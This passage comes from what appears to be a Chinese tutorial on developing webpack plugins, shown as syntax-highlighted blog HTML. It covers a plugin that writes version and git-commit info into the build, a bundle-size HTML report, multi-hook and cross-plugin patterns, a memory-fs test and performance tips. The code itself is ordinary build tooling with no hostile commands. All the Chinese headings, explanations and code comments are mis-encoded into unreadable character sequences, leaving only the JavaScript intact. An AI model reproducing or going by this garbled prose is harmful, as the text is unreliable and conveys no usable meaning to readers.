&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>èµ„æºæ³¨å…¥æ¡ˆä¾‹ï¼šç‰ˆæœ¬ä¿¡æ¯æ³¨å…¥</strong></p><p>éœ€æ±‚åœºæ™¯ï¼š</p><ul><li>åœ¨æ‰“åŒ…æ–‡ä»¶ä¸­æ·»åŠ æ„å»ºç‰ˆæœ¬å·</li><li>è‡ªåŠ¨ç”Ÿæˆæ„å»ºæ—¶é—´æˆ³</li><li>æ³¨å…¥Gitæäº¤ä¿¡æ¯</li></ul><p>å®Œæ•´å®ç°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> &#123; execSync &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">VersionInfoPlugin</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options = &#123;&#125;</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">filename</span> = options.<span class="hljs-property">filename</span> || <span class="hljs-string">&#x27;version.json&#x27;</span>;<br>  &#125;<br>  <br>  <span class="hljs-title function_">getGitInfo</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-attr">branch</span>: <span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;git rev-parse --abbrev-ref HEAD&#x27;</span>).<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">trim</span>(),<br>        <span class="hljs-attr">commit</span>: <span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;git rev-parse HEAD&#x27;</span>).<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">trim</span>().<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">7</span>),<br>        <span class="hljs-attr">date</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()<br>      &#125;;<br>    &#125; <span class="hljs-keyword">catch</span> &#123;<br>      <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Git not available&#x27;</span> &#125;;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) &#123;<br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">emit</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">&#x27;VersionInfoPlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">compilation</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">const</span> versionInfo = &#123;<br>        <span class="hljs-attr">buildTime</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>(),<br>        <span class="hljs-attr">version</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">VERSION</span> || <span class="hljs-string">&#x27;1.0.0&#x27;</span>,<br>        <span class="hljs-attr">env</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span>,<br>        <span class="hljs-attr">git</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getGitInfo</span>()<br>      &#125;;<br>      <br>      <span class="hljs-comment">// å°†ç‰ˆæœ¬ä¿¡æ¯è½¬ä¸ºJSON</span><br>      <span class="hljs-keyword">const</span> json = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(versionInfo, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>);<br>      <br>      <span class="hljs-comment">// æ·»åŠ åˆ°èµ„æºåˆ—è¡¨</span><br>      compilation.<span class="hljs-property">assets</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">filename</span>] = &#123;<br>        <span class="hljs-attr">source</span>: <span class="hljs-function">() =&gt;</span> json,<br>        <span class="hljs-attr">size</span>: <span class="hljs-function">() =&gt;</span> json.<span class="hljs-property">length</span><br>      &#125;;<br>    &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">VersionInfoPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./version-info-plugin&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">VersionInfoPlugin</span>(&#123;<br>      <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;build-info.json&#x27;</span><br>    &#125;)<br>  ]<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>æ„å»ºåˆ†ææ¡ˆä¾‹ï¼šæ¨¡å—ä¾èµ–æŠ¥å‘Š</strong></p><p>éœ€æ±‚åœºæ™¯ï¼š</p><ul><li>ç”Ÿæˆæ¨¡å—ä¾èµ–å…³ç³»å›¾</li><li>ç»Ÿè®¡æ¨¡å—å¤§å°åˆ†å¸ƒ</li><li>è¯†åˆ«å¤§å‹æ¨¡å—</li></ul><p>å®Œæ•´å®ç°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BundleAnalyzerPlugin</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options = &#123;&#125;</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">filename</span> = options.<span class="hljs-property">filename</span> || <span class="hljs-string">&#x27;module-report.html&#x27;</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">threshold</span> = options.<span class="hljs-property">threshold</span> || <span class="hljs-number">100</span>; <span class="hljs-comment">// KB</span><br>  &#125;<br><br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) &#123;<br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">done</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">&#x27;BundleAnalyzerPlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">stats</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">const</span> json = stats.<span class="hljs-title function_">toJson</span>();<br>      <span class="hljs-keyword">const</span> modules = json.<span class="hljs-property">modules</span>;<br>      <br>      <span class="hljs-comment">// 1. æ”¶é›†æ¨¡å—æ•°æ®</span><br>      <span class="hljs-keyword">const</span> moduleData = modules.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">module</span> =&gt;</span> (&#123;<br>        <span class="hljs-attr">id</span>: <span class="hljs-variable language_">module</span>.<span class="hljs-property">id</span>,<br>        <span class="hljs-attr">name</span>: <span class="hljs-variable language_">module</span>.<span class="hljs-property">name</span>,<br>        <span class="hljs-attr">size</span>: <span class="hljs-variable language_">module</span>.<span class="hljs-property">size</span>,<br>        <span class="hljs-attr">chunks</span>: <span class="hljs-variable language_">module</span>.<span class="hljs-property">chunks</span>,<br>        <span class="hljs-attr">reasons</span>: <span class="hljs-variable language_">module</span>.<span class="hljs-property">reasons</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-property">moduleName</span>)<br>      &#125;));<br>      <br>      <span class="hljs-comment">// 2. ç”ŸæˆHTMLæŠ¥å‘Š</span><br>      <span class="hljs-keyword">const</span> html = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateReport</span>(moduleData);<br>      <br>      <span class="hljs-comment">// 3. å†™å…¥è¾“å‡ºç›®å½•</span><br>      <span class="hljs-keyword">const</span> outputPath = path.<span class="hljs-title function_">join</span>(<br>        stats.<span class="hljs-property">compilation</span>.<span class="hljs-property">outputOptions</span>.<span class="hljs-property">path</span>, <br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">filename</span><br>      );<br>      fs.<span class="hljs-title function_">writeFileSync</span>(outputPath, html);<br>    &#125;);<br>  &#125;<br>  <br>  <span class="hljs-title function_">generateReport</span>(<span class="hljs-params">modules</span>) &#123;<br>    <span class="hljs-comment">// è¿‡æ»¤å¤§å‹æ¨¡å—</span><br>    <span class="hljs-keyword">const</span> largeModules = modules.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> m.<span class="hljs-property">size</span> &gt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">threshold</span> * <span class="hljs-number">1024</span>);<br>    <br>    <span class="hljs-comment">// ç”ŸæˆHTMLå†…å®¹</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">  &lt;title&gt;Bundle Analysis Report&lt;/title&gt;</span><br><span class="hljs-string">  &lt;style&gt;</span><br><span class="hljs-string">    table &#123; border-collapse: collapse; width: 100%; &#125;</span><br><span class="hljs-string">    th, td &#123; border: 1px solid #ddd; padding: 8px; &#125;</span><br><span class="hljs-string">    tr:nth-child(even) &#123; background-color: #f2f2f2; &#125;</span><br><span class="hljs-string">  &lt;/style&gt;</span><br><span class="hljs-string">&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">  &lt;h1&gt;Bundle Analysis Report&lt;/h1&gt;</span><br><span class="hljs-string">  </span><br><span class="hljs-string">  &lt;h2&gt;Large Modules (&gt;<span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.threshold&#125;</span>KB)&lt;/h2&gt;</span><br><span class="hljs-string">  &lt;table&gt;</span><br><span class="hljs-string">    &lt;tr&gt;&lt;th&gt;Module&lt;/th&gt;&lt;th&gt;Size (KB)&lt;/th&gt;&lt;th&gt;Dependencies&lt;/th&gt;&lt;/tr&gt;</span><br><span class="hljs-string">    <span class="hljs-subst">$&#123;largeModules.map(m =&gt; <span class="hljs-string">`</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">      &lt;tr&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">        &lt;td&gt;<span class="hljs-subst">$&#123;m.name&#125;</span>&lt;/td&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">        &lt;td&gt;<span class="hljs-subst">$&#123;(m.size / <span class="hljs-number">1024</span>).toFixed(<span class="hljs-number">2</span>)&#125;</span>&lt;/td&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">        &lt;td&gt;<span class="hljs-subst">$&#123;m.reasons.join(<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>)&#125;</span>&lt;/td&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">      &lt;/tr&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">    `</span>).join(<span class="hljs-string">&#x27;&#x27;</span>)&#125;</span></span><br><span class="hljs-string">  &lt;/table&gt;</span><br><span class="hljs-string">  </span><br><span class="hljs-string">  &lt;h2&gt;All Modules&lt;/h2&gt;</span><br><span class="hljs-string">  &lt;table&gt;</span><br><span class="hljs-string">    &lt;tr&gt;&lt;th&gt;Module&lt;/th&gt;&lt;th&gt;Size (KB)&lt;/th&gt;&lt;/tr&gt;</span><br><span class="hljs-string">    <span class="hljs-subst">$&#123;modules.map(m =&gt; <span class="hljs-string">`</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">      &lt;tr&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">        &lt;td&gt;<span class="hljs-subst">$&#123;m.name&#125;</span>&lt;/td&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">        &lt;td&gt;<span class="hljs-subst">$&#123;(m.size / <span class="hljs-number">1024</span>).toFixed(<span class="hljs-number">2</span>)&#125;</span>&lt;/td&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">      &lt;/tr&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">    `</span>).join(<span class="hljs-string">&#x27;&#x27;</span>)&#125;</span></span><br><span class="hljs-string">  &lt;/table&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;`</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é«˜çº§æ’ä»¶å¼€å‘æŠ€å·§</strong></p><p>(1) å¤šé’©å­ååŒå·¥ä½œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdvancedPlugin</span> &#123;<br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) &#123;<br>    <span class="hljs-comment">// ç¼–è¯‘å¼€å§‹å‰å‡†å¤‡æ•°æ®</span><br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">beforeRun</span>.<span class="hljs-title function_">tapAsync</span>(<span class="hljs-string">&#x27;AdvancedPlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">compiler, callback</span>) =&gt;</span> &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">cache</span> = <span class="hljs-title function_">fetchData</span>();<br>      <span class="hljs-title function_">callback</span>();<br>    &#125;);<br>    <br>    <span class="hljs-comment">// å¤„ç†æ¨¡å—</span><br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">compilation</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">&#x27;AdvancedPlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">compilation</span>) =&gt;</span> &#123;<br>      compilation.<span class="hljs-property">hooks</span>.<span class="hljs-property">buildModule</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">&#x27;AdvancedPlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params"><span class="hljs-variable language_">module</span></span>) =&gt;</span> &#123;<br>        <span class="hljs-variable language_">module</span>.<span class="hljs-property">useCache</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">cache</span>.<span class="hljs-title function_">has</span>(<span class="hljs-variable language_">module</span>.<span class="hljs-property">id</span>);<br>      &#125;);<br>    &#125;);<br>    <br>    <span class="hljs-comment">// èµ„æºè¾“å‡º</span><br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">emit</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">&#x27;AdvancedPlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">compilation</span>) =&gt;</span> &#123;<br>      compilation.<span class="hljs-property">assets</span>[<span class="hljs-string">&#x27;cache-info.json&#x27;</span>] = &#123;<br>        <span class="hljs-attr">source</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">cache</span>.<span class="hljs-property">stats</span>),<br>        <span class="hljs-attr">size</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">cache</span>.<span class="hljs-property">stats</span>).<span class="hljs-property">length</span><br>      &#125;;<br>    &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) è·¨æ’ä»¶é€šä¿¡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ’ä»¶Aï¼šæä¾›æ•°æ®</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataProviderPlugin</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = &#123;&#125;;<br>  &#125;<br>  <br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) &#123;<br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">thisCompilation</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">&#x27;DataProviderPlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">compilation</span>) =&gt;</span> &#123;<br>      compilation.<span class="hljs-property">dataProvider</span> = <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// æš´éœ²æ¥å£</span><br>    &#125;);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// æ’ä»¶Bï¼šä½¿ç”¨æ•°æ®</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataConsumerPlugin</span> &#123;<br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) &#123;<br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">compilation</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">&#x27;DataConsumerPlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">compilation</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (compilation.<span class="hljs-property">dataProvider</span>) &#123;<br>        <span class="hljs-keyword">const</span> data = compilation.<span class="hljs-property">dataProvider</span>.<span class="hljs-property">data</span>;<br>        <span class="hljs-comment">// ä½¿ç”¨æ•°æ®...</span><br>      &#125;<br>    &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ’ä»¶è°ƒè¯•ä¸æµ‹è¯•</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> webpack = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">MemoryFS</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;memory-fs&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">runWebpack</span>(<span class="hljs-params">config</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> compiler = <span class="hljs-title function_">webpack</span>(config);<br>    <span class="hljs-keyword">const</span> fs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MemoryFS</span>();<br>    compiler.<span class="hljs-property">outputFileSystem</span> = fs;<br>    <br>    compiler.<span class="hljs-title function_">run</span>(<span class="hljs-function">(<span class="hljs-params">err, stats</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(err);<br>      <span class="hljs-title function_">resolve</span>(&#123; stats, fs &#125;);<br>    &#125;);<br>  &#125;);<br>&#125;<br><br><span class="hljs-comment">// æµ‹è¯•ç”¨ä¾‹</span><br><span class="hljs-title function_">test</span>(<span class="hljs-string">&#x27;VersionInfoPlugin generates file&#x27;</span>, <span class="hljs-title function_">async</span> () =&gt; &#123;<br>  <span class="hljs-keyword">const</span> config = &#123;<br>    <span class="hljs-attr">plugins</span>: [<span class="hljs-keyword">new</span> <span class="hljs-title class_">VersionInfoPlugin</span>()]<br>  &#125;;<br>  <br>  <span class="hljs-keyword">const</span> &#123; fs &#125; = <span class="hljs-keyword">await</span> <span class="hljs-title function_">runWebpack</span>(config);<br>  <span class="hljs-title function_">expect</span>(fs.<span class="hljs-title function_">existsSync</span>(<span class="hljs-string">&#x27;/dist/version.json&#x27;</span>)).<span class="hljs-title function_">toBe</span>(<span class="hljs-literal">true</span>);<br>  <br>  <span class="hljs-keyword">const</span> content = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/dist/version.json&#x27;</span>));<br>  <span class="hljs-title function_">expect</span>(content).<span class="hljs-title function_">toHaveProperty</span>(<span class="hljs-string">&#x27;buildTime&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŒ–ç­–ç•¥</strong></p><p>(1) é¿å…é˜»å¡é’©å­</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é”™è¯¯ï¼šåœ¨åŒæ­¥é’©å­ä¸­æ‰§è¡ŒI/Oæ“ä½œ</span><br>compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">compilation</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">&#x27;MyPlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">compilation</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> data = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;large-data.json&#x27;</span>); <span class="hljs-comment">// é˜»å¡æ“ä½œ</span><br>&#125;);<br><br><span class="hljs-comment">// æ­£ç¡®ï¼šå¼‚æ­¥å¤„ç†</span><br>compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">beforeRun</span>.<span class="hljs-title function_">tapAsync</span>(<span class="hljs-string">&#x27;MyPlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">compiler, callback</span>) =&gt;</span> &#123;<br>  fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;large-data.json&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(err);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = data;<br>    <span class="hljs-title function_">callback</span>();<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>(2) ç¼“å­˜è®¡ç®—ç»“æœ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CachedPlugin</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">cache</span> = <span class="hljs-literal">null</span>;<br>  &#125;<br>  <br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) &#123;<br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">thisCompilation</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">&#x27;CachedPlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">compilation</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">cache</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">cache</span> = <span class="hljs-title function_">heavyCalculation</span>(); <span class="hljs-comment">// åªè®¡ç®—ä¸€æ¬¡</span><br>      &#125;<br>      compilation.<span class="hljs-property">cache</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">cache</span>;<br>    &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æœ€ä½³å®è·µæŒ‡å—</strong></p><p>(1) æ’ä»¶è®¾è®¡åŸåˆ™</p><table><thead><tr><th align="left">åŸåˆ™</th><th align="left">è¯´æ˜</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">å•ä¸€èŒè´£</td><td align="left">ä¸€ä¸ªæ’ä»¶åªåšä¸€ä»¶äº‹</td><td align="left">åˆ†ç¦»èµ„æºæ³¨å…¥å’Œæ„å»ºåˆ†æ</td></tr><tr><td align="left">é…ç½®é©±åŠ¨</td><td align="left">é€šè¿‡é€‰é¡¹æ§åˆ¶è¡Œä¸º</td><td align="left"><code>new Plugin(&#123; filename: &#39;report.html&#39; &#125;)</code></td></tr><tr><td align="left">é”™è¯¯å¤„ç†</td><td align="left">å¦¥å–„å¤„ç†å¼‚å¸¸</td><td align="left">ä½¿ç”¨compilation.errorsæ”¶é›†é”™è¯¯</td></tr><tr><td align="left">æ–‡æ¡£å®Œå–„</td><td 